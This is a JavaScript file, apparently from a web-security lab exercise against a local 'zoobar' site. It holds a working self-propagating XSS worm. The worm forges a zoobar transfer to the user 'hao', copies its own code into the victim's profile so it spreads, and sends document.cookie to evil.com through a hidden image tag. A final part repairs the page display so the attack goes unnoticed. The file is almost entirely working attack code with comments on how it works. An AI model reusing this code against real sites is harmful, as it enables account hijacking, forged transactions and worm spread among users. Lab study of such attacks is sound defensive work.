	alert('it works');

/*part1*/
        xmlhttp=new XMLHttpRequest();   //transfer one zoobar to the user 'hao'
        xmlhttp.open("POST","http://127.0.0.1/myzoo/transfer.php",false);//sync mode
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded"); //without this line the parameters wont be passed correctly
        xmlhttp.send("zoobars=1&recipient=hao&submission=Send"); //parameters


/*part2*/
        xmlhttp=new XMLHttpRequest();   //change user's profile.
        xmlhttp.open("POST","http://127.0.0.1/myzoo/index.php",false);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");

	hackcode=document.getElementById("hackbox").outerHTML;   //get the entire worm's code from current page
	console.info(hackcode);  //debug info

	tmpcode=hackcode.replace(/'/g,"&#39");   //change the "'" character to #39, otherwise a database error will occur.
						//this line can be omitted if String.fromCharCode(39) is used instead of &#39 in profile
	console.info(tmpcode);
	tmpcode=encodeURIComponent(tmpcode);   //encode the whole string, otherwise some special characters will be lost during POSTing a form
	console.info(tmpcode);
        xmlhttp.send("profile_submit=Save&profile_update="+tmpcode);  //other parameters


/*part3*/
	document.write("<img src=http://evil.com:88/"+document.cookie+ " style=display:none />");   // the code for stealing cookies



/*part4*/
//the codes below is optional

//fix some HTML elements which has been broke by our xss code.
//without the codes below, user's zoobar wont be shown correctly

//==========================================================================
	var main = document.getElementsByClassName('main')[0];
	
	zoobar_cnt=parseInt(main.children[3].className);  //get the real zoobar count
	user=main.getElementsByTagName('input')[0].value; //get the username
	console.info(user);

	function showZoobars(zoobars) {
		document.getElementById("profileheader").innerHTML =
			user+"'s zoobars:" + zoobars;
		if (zoobars < zoobar_cnt) {
			setTimeout("showZoobars(" + (zoobars + 1) + ")", 20);
		}
	}
	showZoobars(0);  // count up to total
//=================================================================================
//	aaa= eval(" {;;;123}")
//	console.info(aaa);
